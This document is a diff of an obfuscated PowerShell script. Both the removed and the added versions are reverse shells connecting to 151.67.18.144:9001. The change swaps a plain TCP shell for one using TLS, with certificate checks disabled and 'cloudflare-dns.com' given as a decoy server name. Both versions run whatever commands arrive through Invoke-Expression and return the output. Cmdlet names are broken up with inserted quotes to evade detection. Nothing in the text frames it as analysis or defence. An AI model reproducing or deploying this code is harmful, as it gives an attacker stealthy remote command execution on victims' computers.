@@ -1,57 +1,11 @@
-$a31f5eb36e414953a3acd63ee01eaa42= "151.67.18.144"; 
-$2379458d610d4610bf1293f7684c9cfd= 9001; 
-$6a0be6bf54ff432ba8f391c207011746= N''e''w''-''O''b''j''e''c''t Net.Sockets.TCPClient($a31f5eb36e414953a3acd63ee01eaa42, $2379458d610d4610bf1293f7684c9cfd); 
-$284fe231fe2e4659977be57b1702cc35= $6a0be6bf54ff432ba8f391c207011746.GetStream(); 
-$e225c7d0cbd24219aded4081da25937d= N''ew-''O''b''j''e''c''t IO.StreamWriter($284fe231fe2e4659977be57b1702cc35); 
-$e225c7d0cbd24219aded4081da25937d.AutoFlush= $true; 
-$e68d9a4e0b6b4d0398ea9a84079c64e6= Ne''w''-O''b''j''e''c''t System.Byte[] 65536; 
-$15b6194d6fbb4a448bb683f9656056dc= "";
-$f44caa96acf84a81bdc6abbece8c3c8a= $false;
-
-while ($6a0be6bf54ff432ba8f391c207011746.Connected) { 
-    try {
-        # Invia pro''mp''t ALLA FINE dell'output precedente (o all'inizio)
-        if (-not $f44caa96acf84a81bdc6abbece8c3c8a) {
-            $50918ab6a3294ef8b4193119ebb3dede= "PS $((Get-Location).Path)> ";
-            $a2b0fa781e53420483cb0453f533feef= [text.encoding]::UTF8.GetBytes($50918ab6a3294ef8b4193119ebb3dede);
-            $284fe231fe2e4659977be57b1702cc35.Write($a2b0fa781e53420483cb0453f533feef, 0, $a2b0fa781e53420483cb0453f533feef.Length);
-            $f44caa96acf84a81bdc6abbece8c3c8a= $true;
-        }
-        
-        $74988e252e6044a2868dcf180a8e0ea3= 0;
-        $3c28b458243a4a27937be3daeb49288f= $284fe231fe2e4659977be57b1702cc35.Read($e68d9a4e0b6b4d0398ea9a84079c64e6, $74988e252e6044a2868dcf180a8e0ea3, $e68d9a4e0b6b4d0398ea9a84079c64e6.Length - $74988e252e6044a2868dcf180a8e0ea3);
-        if ($3c28b458243a4a27937be3daeb49288f -eq 0) { continue }
-        $74988e252e6044a2868dcf180a8e0ea3 += $3c28b458243a4a27937be3daeb49288f;
-        
-        while ($284fe231fe2e4659977be57b1702cc35.DataAvailable -and $74988e252e6044a2868dcf180a8e0ea3 -lt $e68d9a4e0b6b4d0398ea9a84079c64e6.Length - 1) {
-            $3c28b458243a4a27937be3daeb49288f= $284fe231fe2e4659977be57b1702cc35.Read($e68d9a4e0b6b4d0398ea9a84079c64e6, $74988e252e6044a2868dcf180a8e0ea3, $e68d9a4e0b6b4d0398ea9a84079c64e6.Length - $74988e252e6044a2868dcf180a8e0ea3);
-            if ($3c28b458243a4a27937be3daeb49288f -eq 0) { break }
-            $74988e252e6044a2868dcf180a8e0ea3 += $3c28b458243a4a27937be3daeb49288f;
-        }
-        
-        if ($74988e252e6044a2868dcf180a8e0ea3 -gt 0) {
-            $15b6194d6fbb4a448bb683f9656056dc = ([text.encoding]::UTF8).GetString($e68d9a4e0b6b4d0398ea9a84079c64e6, 0, $74988e252e6044a2868dcf180a8e0ea3).Trim();
-            
-            if ($15b6194d6fbb4a448bb683f9656056dc.Length -gt 0 -and $15b6194d6fbb4a448bb683f9656056dc -ne "") {
-                $f44caa96acf84a81bdc6abbece8c3c8a= $false;  # Resetta per prossimo p''r''o''m''p''t dopo output
-                
-                $d9d71bab793f4a628b11279757ff5472= try { 
-                    Invok''e-Expr''ession $15b6194d6fbb4a448bb683f9656056dc 2>&1 | Ou''t-S''tri''n''g
-                } catch { 
-                    "ERRORE: $($_.Exception.Message)`n"
-                }; 
-                
-                if ($d9d71bab793f4a628b11279757ff5472 -and $d9d71bab793f4a628b11279757ff5472.Trim() -ne "") {
-                    $d9d71bab793f4a628b11279757ff5472= $d9d71bab793f4a628b11279757ff5472.TrimEnd();
-                    $c52fec323c1448239d78b62449778d48= [text.encoding]::UTF8.GetBytes("$d9d71bab793f4a628b11279757ff5472`n");
-                    $284fe231fe2e4659977be57b1702cc35.Write($c52fec323c1448239d78b62449778d48, 0, $c52fec323c1448239d78b62449778d48.Length);
-                }
-            }
-        }
-    } catch {
-        # Silenzioso
-    }
-    Star''t-''S''l''ee''p -Milliseconds 50;
-}
-
-$6a0be6bf54ff432ba8f391c207011746.Close(); $284fe231fe2e4659977be57b1702cc35.Close(); $e225c7d0cbd24219aded4081da25937d.Close()
+$106ba2b0e031448bba2be9f09632d27f= [System.Security.Authentication.SslProtocols]::Tls12; 
+$c142ec7d1ad04c64bfb6f8860edcb2e8= N''ew-Ob''je''c''t Net.Sockets.TCPClient('151.67.18.144', 9001);
+$14c7ec222b174d8288c407db58c1367b= $c142ec7d1ad04c64bfb6f8860edcb2e8.GetStream();
+$d91e25d826e0408ba6175f16e434b031= New''-''O''b''j''ec''t Net.Security.SslStream($14c7ec222b174d8288c407db58c1367b,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));
+$d91e25d826e0408ba6175f16e434b031.AuthenticateAsClient('cloudflare-dns.com',$null,$106ba2b0e031448bba2be9f09632d27f,$false);
+if(!$d91e25d826e0408ba6175f16e434b031.IsEncrypted -or !$d91e25d826e0408ba6175f16e434b031.IsSigned) {$d91e25d826e0408ba6175f16e434b031.Close();exit}$c5f63f8b8cf04d228e360b6e6d063a20 = N''e''w''-''O''b''j''e''c''t IO.StreamWriter($d91e25d826e0408ba6175f16e434b031);
+function WriteToStream ($String) {[byte[]]$script:Buffer = N''ew''-''O''bj''e''c''t System.Byte[] 4096 ;
+$c5f63f8b8cf04d228e360b6e6d063a20.Write($String + 'SHELL> ');
+$c5f63f8b8cf04d228e360b6e6d063a20.Flush()};
+WriteToStream '';
+while(($c327187d0e2749e7ac0b0998b573965d = $d91e25d826e0408ba6175f16e434b031.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$ab021f4c7a6d4f1fb9af3de9458b8106= ([text.encoding]::UTF8).GetString($Buffer, 0, $c327187d0e2749e7ac0b0998b573965d - 1);$0c25e7324fcb4f129887aad3e879912f = try {In''v''ok''e-''Ex''pr''es''s''io''n $ab021f4c7a6d4f1fb9af3de9458b8106 2>&1 | Out-S''tring} catch {$_ | Out''-S''trin''g}WriteToStream ($0c25e7324fcb4f129887aad3e879912f)}$c5f63f8b8cf04d228e360b6e6d063a20.Close()
